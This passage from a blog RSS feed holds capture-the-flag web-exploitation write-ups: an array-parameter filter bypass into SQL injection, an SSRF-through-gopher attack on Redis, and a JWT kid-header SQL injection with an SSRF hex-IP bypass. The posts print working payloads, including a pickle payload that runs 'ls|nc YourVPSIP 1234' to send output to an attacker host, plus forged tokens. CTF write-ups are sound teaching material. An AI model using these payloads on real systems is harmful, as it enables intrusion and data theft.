&lt;p&gt;&lt;strong&gt;req.query.q&lt;/strong&gt; will be parsed as an array &lt;strong&gt;[&amp;ldquo;hello&amp;rdquo;,&amp;ldquo;allo&amp;rdquo;,&amp;ldquo;fword&amp;rdquo;]&lt;/strong&gt; , so if we go further when we will be iterating of &lt;strong&gt;q&lt;/strong&gt; variable we will be comparing each array field with the filters
for example, if we pass this query :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;q=&amp;ldquo;or 1=1 &amp;ndash; -&amp;amp;q=fword&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;we will firstly compare &lt;strong&gt;&amp;ldquo;or 1=1 &amp;ndash; -&lt;/strong&gt; and then the second field &lt;strong&gt;fword&lt;/strong&gt; with these filtered chars &lt;strong&gt;[&amp;rsquo;,-,&amp;rdquo;,.]&lt;/strong&gt; , they are not equal ! , Youupi we can get our flag now as we passed the check .&lt;/p&gt;
&lt;p&gt;Unfortunately , it&amp;rsquo;s not that easy ,have you forgot the substring function ? an array has not a built in substring function so when we reach the substring part this will raise an error so we won&amp;rsquo;t execute the sql query :/
Javascript weird behaviour will save us this time ! if we do &lt;strong&gt;[]+[]&lt;/strong&gt; the result is a string , the sum of two arrays is a string so if we enter a &lt;strong&gt;&amp;rdquo;&lt;/strong&gt; in one query parameter
we will enter this part&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;censored = true;
q = q.slice(0, i) + &amp;quot;*&amp;quot; + q.slice(i + 1, q.length);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;and arrays have a built in slice function so the result of &lt;strong&gt;[]+&amp;quot;*&amp;quot;+[]&lt;/strong&gt; will be a string , we can now enter our payload with &lt;strong&gt;q=&amp;rsquo;&lt;/strong&gt; in the end to ensure that our array will be a string when it reaches the substring part
For example :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;q=&amp;lsquo;or 1=1 &amp;ndash; -&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=&amp;rsquo;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;will let us pass !&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;FILTERS BYPASSED SUCCESSFULLY&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;To test the number of q parameters and debug the app , i changed a little bit the source code and hosted the web app locally , you can find the modified source code &lt;strong&gt;
&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/blob/master/%C3%A5ngstromCTF2k20/A%20Peculiar%20Query/app.js&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;&lt;/strong&gt; if you want to test :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/upRUoxR.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;The next part is pretty classic , a simple sql injection , we will first dump the columns name (we know the table name from the source code)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;q=%27union%20SELECT%20column_name%20FROM%20information_schema.columns%20&amp;ndash;%20-&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=%27&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/XAVrsrR.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;and finally we find a column named &lt;strong&gt;crime&lt;/strong&gt; so our final payload will be :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;HOST/?q=%27union%20SELECT%20crime%20FROM%20criminals%20&amp;ndash;%20-&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=%27&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/7KWe6dF.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;And Congratulations ! I want to thank the organizers for this great CTF and fun tasks , i have really enjoyed participating&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Shinobis World - Web Exploitation NCSC 2.0 CTF</title>
      <link>https://ahmed-belkahla.me/post/shinobisworld/</link>
      <pubDate>Thu, 23 Jan 2020 00:00:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/shinobisworld/</guid>
      <description>&lt;h1 id=&#34;shinobis-world-1000pts-1-solves&#34;&gt;&lt;strong&gt;Shinobis World (1000pts) (1 Solves)&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/7X3dgtW.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Hello guys again , in this task we are give the Settings.py of a django Web application , we can notice that the website is using caching with redis that is listening on port 6379 locally !&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/60QSkz4.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Our first impression, we see an url fetcher that is curling websites which will be probably some SSRF , we try the usual payloads and we find that file ,localhost and 127.0.0.1 are filtered
so we can use 127.0.1 and maybe http or gopher protocol , firstly let&amp;rsquo;s think , as we said we had a redis instance that is running on localhost , so may be using the ssrf we can interact with it&lt;/p&gt;
&lt;p&gt;in fact you can use gopher protocol to interact with redis :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;gopher://127.0.1:6379/_RedisCommandHERE&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;for example to list all keys:&lt;/p&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;gopher://127.0.1:6379/_keys%20*&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;p&gt;if we refresh the shinobis web page and then list all keys we can see some new keys that are set :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;:1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;:1:views.decorators.cache.cache_header..a906279c6f1b8c76747a8ba71e866d8c.en-us.UTC&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/bOKKP3k.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;If you read the Django Manual you will find that the caching system in django is a little bit different , first of all django will serialize the header and the rest of the page using pickle then it will cache them in the memory&lt;/p&gt;
&lt;p&gt;So the idea is to forge our payload using pickle and the set the default key of django (:1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC) with our payload , here is what will happen chronologically :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Django will try to load the page so firstly he will check if the :1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC key is set&lt;/li&gt;
&lt;li&gt;if the key is set he will unpickle the data stored there and load the page using this content&lt;/li&gt;
&lt;li&gt;Our payload will be executed then Bingo we will have the flag :D&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Final Payload :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;gopher://127.0.1:6379/aset%20:1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC%20&amp;quot;cposix\nsystem\np0\n(S&amp;rsquo;ls|nc YourVPSIP 1234&amp;rsquo;\np1\ntp2\nRp3\n.&amp;quot;
This Payload will execute ls command and send it to our vps (don&amp;rsquo;t forget to refresh the Shinobis page because it&amp;rsquo;s the page that is being cached)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note:&lt;/strong&gt;&lt;/em&gt; You can find the source code of this task in the source code repo of my github repo&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;I hope that you liked the challenge , i tried to combine the SSRF with this default feature of django that can be used maliciously , it can be applied with any caching system (Memcached or Redis ..)
If you have any questions dont forget to contact me and if you liked this writeup please star this repo :D&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>JWT In A New Way - NCSC 2.0 CTF</title>
      <link>https://ahmed-belkahla.me/post/jwt-in-a-new-way/</link>
      <pubDate>Wed, 22 Jan 2020 00:00:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/jwt-in-a-new-way/</guid>
      <description>&lt;h1 id=&#34;jwt-in-a-new-way-1000pts-0-solves&#34;&gt;&lt;strong&gt;JWT In a new way (1000pts) (0 Solves)&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/YuMeMZE.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;And finally i&amp;rsquo;m writing a writeup for this task xD i published this task in Securinets Mini CTF and NCSC2.0_CTF but unfortunately it had 0 solves (in fact no one managed to pass the first step) , it took me a lot of time to prepare this task so i hope you enjoy it :D
However bring your coffee cup and let&amp;rsquo;s begin the road . This Task has 3 steps , the first one is bypassing JWT token with a custom attack (not the regular ones) actually using an SQL injection in one of the token parameters , then we will have to exploit an ssrf to crypt the content of flag file (too much filters here haha)&lt;/p&gt;
&lt;h2 id=&#34;1st-step--jwt-bypass&#34;&gt;1st Step : JWT Bypass&lt;/h2&gt;
&lt;p&gt;After visiting the link we have a simple web page with a sign in and sign up page ;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/y8vDSCL.png&#34; alt=&#34;HOME&#34;&gt;&lt;/p&gt;
&lt;p&gt;So after registering with random creds and signing in we check the cookies and as the task name refers we find a jwt token&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/mmFsMEd.png&#34; alt=&#34;HOME&#34;&gt;&lt;/p&gt;
&lt;p&gt;We go as usual to the famous jwt.io to see the content of the token&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/TRIhUBU.png&#34; alt=&#34;JWT&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can try all the regular attacks but nothing will work , the kid value in the header is suspicious as we dont see it always in JWT tokens so after some googling we can conclude
that the kid parameter is used when the jwt token is signed using multiple keys , each kid value refers to a different key (Example: kid:1 refers for ex to the key &amp;lsquo;blabla&amp;rsquo;
and when we have kid:2 we are using a different key to sign the jwt token) Hmmm things are getting interesting here, we can suppose that the keys are fetched from a database maybe ,
let&amp;rsquo;s read again the description , we can notice a hint for SQL so maybe we have an SQL injection ? Let&amp;rsquo;s try to trigger an error by injecting this in the kid parameter&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;rsquo; UNION SELECT 2 &amp;ndash; -&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;But Before you will have to fully understand how JWT tokens are forged, because there is no libraries that include the kid implementation so let&amp;rsquo;s take some notes here :&lt;/p&gt;
&lt;p&gt;As we all know JWT token have 3 sections : Header + Payload + signature&lt;/p&gt;
&lt;p&gt;Header : typically consists of two parts: the type of the token, which is JWT, and the signing algorithm being used, such as HMAC SHA256 or RSA but here we have also the kid part which is optional&lt;/p&gt;
&lt;p&gt;Payload : it contains statements about an entity (typically, the user) and additional data .&lt;/p&gt;
&lt;p&gt;Signature : Simply if we are using HS256 the sig is : Signature= HMACSHA256(BASE64URL(HEADER)+&amp;rsquo;.&amp;rsquo;+BASE64URL(PAYLOAD))&lt;/p&gt;
&lt;p&gt;Be careful it&amp;rsquo;s BASE64URL not a regular BASE64 you can read about it here : 
&lt;a href=&#34;https://fr.wikipedia.org/wiki/Base64#base64url&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;LINK&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;NOTE: you can use the php function hash_hmac(&amp;lsquo;sha256&amp;rsquo;, $msg, $key, true) to sign the token&lt;/p&gt;
&lt;p&gt;so after forging the JWT token and replacing it we got this page !&lt;/p&gt;
&lt;p&gt;Token i used (i have used a random key for the signature) :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;eyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogIiAnIFVOSU9OIFNFTEVDVCAyIC0tIC0ifQ.eyJ1c2VyIjogImFhIiwidHlwZSI6ICJhZG1pbiJ9.xXh6UOMjm0YtgmiIsL6VExdDCLiUhIEF28kjv8UzWpo&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/GHbrcmm.png&#34; alt=&#34;JWT&#34;&gt;&lt;/p&gt;
&lt;p&gt;Hmmmmmmm an interesting message i think we are on a good path , now let&amp;rsquo;s think wisely , we have two paths now , the first one is to try to leak the keys with a blind SQL injection which is really painful especially if we face some filters and the second one which we will follow.&lt;/p&gt;
&lt;p&gt;We will force the jwt token to use a key we provide to sign the token ; after some regular SQL injection tests we found that we had two columns which is expected (a column for the id and a column for the key ) we use this payload in the kid parameter&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;lsquo;UNION SELECT 1,&amp;lsquo;kahla&amp;rsquo; &amp;ndash; -&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Thus the key will be forced to be kahla BUT we still get the annoying page &amp;ldquo;Here is your flag ! Just kidding &amp;quot; :&amp;rsquo;( (What an evil author 3:) )&lt;/p&gt;
&lt;p&gt;I think there are some filters here :&amp;rsquo;( Let&amp;rsquo;s try this payload in the kid parameter :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;lsquo;UNiOn SElEcT 1,&amp;lsquo;abc&amp;rsquo; &amp;ndash; -&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The final token used:&lt;/p&gt;
&lt;p&gt;eyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogIidVTmlPbiBTRWxFY1QgMSwnYWJjJyAtLSAtIn0.eyJ1c2VyIjogIiIsInR5cGUiOiAiYWRtaW4ifQ.3cOHXg1U7Mj_I3ag37oeg5KWJYA11T74bbD4NrcMC8A&lt;/p&gt;
&lt;p&gt;And yeeeeeeees we did it ! but WTF where is our flag ! we need to finish this step before&lt;/p&gt;
&lt;h2 id=&#34;2nd-step--ssrf--decrypt&#34;&gt;2nd Step : SSRF + Decrypt&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/BLjbHaj.png&#34; alt=&#34;CRYPT&#34;&gt;&lt;/p&gt;
&lt;p&gt;It&amp;rsquo;s a web application that crypts a txt file and after some tries i figured that it only accepts urls that finish with .txt extension&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/9mPssf6.png&#34; alt=&#34;CRYPT&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can all notice that it&amp;rsquo;s an ssrf but:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;file protocol is filtered we only can use http or https protocol&lt;/li&gt;
&lt;li&gt;localhost,127.0.0.1,127.0.1,the octal form of ip , and even ipv6 localhost address are filtered&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Finally i used this payload that bypassed all the filters below :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;http://0x7f000001/flag.txt&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I used the hexadecimal format of local ip address :D&lt;/p&gt;
&lt;p&gt;And Bingo we have our flag but it&amp;rsquo;s encrypted
&lt;img src=&#34;https://imgur.com/cFehJVI.png&#34; alt=&#34;CRYPT&#34;&gt;&lt;/p&gt;
&lt;p&gt;If you check the source code you find a hint that leads us to visit robots.txt file and BINGO we find the crypting function&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;public static function cryptage($content){
        $i=0;
        $words=array(&#39;kAHl4&#39;,&#39;$ecUriNets&#39;,&#39;Cha1m4&#39;,&#39;th4meUr&#39;,&#39;WhiT3HacK3Rs&#39;,&#39;Ani$Bo$$CoUldNtS0Lv31t&#39;);
        $crypted=&amp;quot;&amp;quot;;
        for($i=0;$i&amp;lt;strlen($content);$i-=-pow(0,0))
        {
            $ser=serialize(array($words[$i % 6],&#39;securinets&#39;));
            $key=intval(explode(&amp;quot;:&amp;quot;,explode(&amp;quot;;&amp;quot;,$ser)[1])[1]);
            $crypted=$crypted.chr(ord($content[$i])+$key) ;          
        }
        return $crypted;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;But it&amp;rsquo;s somehow a little bit obfuscated , however after digging here is the decrypt function&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;function decryptage($content){
        $i=0;
        $words=array(&#39;kAHl4&#39;,&#39;$ecUriNets&#39;,&#39;Cha1m4&#39;,&#39;th4meUr&#39;,&#39;WhiT3HacK3Rs&#39;,&#39;Ani$Bo$$CoUldNtS0Lv31t&#39;);
        $decrypted=&amp;quot;&amp;quot;;
        for($i=0;$i&amp;lt;strlen($content);$i-=-pow(0,0))
        {
            $ser=serialize(array($words[$i % 6],&#39;securinets&#39;));
            $key=intval(explode(&amp;quot;:&amp;quot;,explode(&amp;quot;;&amp;quot;,$ser)[1])[1]);
            $decrypted=$decrypted.chr(ord($content[$i])-$key) ;
        }
        return $decrypted ;
    }
$cont=&amp;quot;eG9pfH5/c296eu+/vW01On1mP++/vTh4ZVt0SWRLe3tU77+9d2lJO1rvv71kXTZzYklkXk44MDcm77+9EA==&amp;quot; ;
$con=base64_decode($cont);
$res= decryptage($con);
echo $res;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Executing this will give you the flag but with some unreadable characters (because of the non printable characters after crypting it) that&amp;rsquo;s why we can use curl in our cli and extract the crypted flag and save it or simply we can use a little python script
that automates this and FINALLY we got The flag :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;securinets{W00w_3v3n_Th3_AutHor_C4Nt_S0lV3_TH1$!!}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;*** Conclusion ***&lt;/p&gt;
&lt;p&gt;I hope you liked this task , it took me 4 continuous days of hard work to implement this idea ( i had to write a big part of jwt generator ) you can find the source code in the same directory ! Anyways dont forget to star me and if you faced any problems please contact me!&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>
